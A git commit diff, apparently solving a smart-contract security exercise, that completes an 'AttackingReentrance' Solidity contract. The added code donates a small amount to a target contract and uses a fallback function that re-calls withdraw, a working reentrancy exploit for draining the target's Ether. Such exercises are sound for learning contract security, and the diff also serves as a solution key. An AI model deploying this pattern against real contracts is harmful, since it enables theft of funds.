fe8d17c132e00e4dbba254ed5475a1247029a069
ganzai-san <ganzai@protonmail.com>
2022-04-02 17:06:00 -0400

    reentrance hack

--- contracts/6. Reentrance/AttackingReentrance.sol
+++ contracts/6. Reentrance/AttackingReentrance.sol
@@ -4,12 +4,20 @@ import "./Reentrance.sol";
 
 contract AttackingReentrance {
     address payable public contractAddress;
+    Reentrance public reentreance;
 
     constructor(address payable _contractAddress) payable {
         contractAddress = _contractAddress;
+        reentreance = Reentrance(contractAddress);
+    }
+
+    // Fallback is called when Reentrance sends Ether to this contract.
+    fallback() external payable {
+        reentreance.withdraw();
     }
 
     function hackContract() external {
-        // Code me!
+        reentreance.donate{value: 1}(address(this));
+        reentreance.withdraw();
     }
 }
